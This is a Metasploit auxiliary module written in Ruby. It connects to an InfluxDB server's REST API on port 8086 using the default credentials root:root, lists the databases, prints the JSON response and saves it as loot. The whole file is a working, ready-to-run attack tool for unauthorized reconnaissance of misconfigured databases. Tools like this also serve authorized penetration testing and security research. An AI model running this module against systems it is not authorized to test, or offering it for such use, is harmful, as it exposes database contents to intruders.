##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'InfluxDB Enum Utility',
      'Description'    => %q{
        This module enumerates databases on InfluxDB using the REST API using the
        default authentication of root:root.
      },
      'References'     =>
        [
          ['URL', 'http://influxdb.com/docs/v0.9/concepts/reading_and_writing_data.html']
        ],
      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8086),
        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/db']),
        OptString.new('USERNAME', [true, 'The username to login as', 'root']),
        OptString.new('PASSWORD', [true, 'The password to login with', 'root'])
      ])
  end

  def run
    begin
      res = send_request_cgi(
        'uri'           => normalize_uri(target_uri.path),
        'method'        => 'GET'
      )
    rescue ::Errno::EPIPE, ::Timeout::Error, ::EOFError, ::IOError => e
      print_error("The following Error was encountered: #{e.class}")
      return
    end

    unless res
      print_error("Server did not respond in an expected way.")
      return
    end

    if res.code == 401 && res.body =~ /Invalid username\/password/
      print_error("Failed to authenticate. Invalid username/password.")
      return
    elsif res.code == 200 && res.headers.include?('X-Influxdb-Version') && res.body.length > 0
      print_status("Enumerating...")
      begin
        temp = JSON.parse(res.body)
        if temp.blank?
          print_status("Json data is empty")
          return
        end
        results = JSON.pretty_generate(temp)
      rescue JSON::ParserError
        print_error("Unable to parse JSON data.")
        return
      end
      print_good("Found:\n\n#{results}\n")
      path = store_loot(
        'influxdb.enum',
        'text/plain',
        rhost,
        results,
        'InfluxDB Enum'
      )
      print_good("File saved in: #{path}")
    else
      print_error("Unable to enum, received \"#{res.code}\"")
    end
  end
end
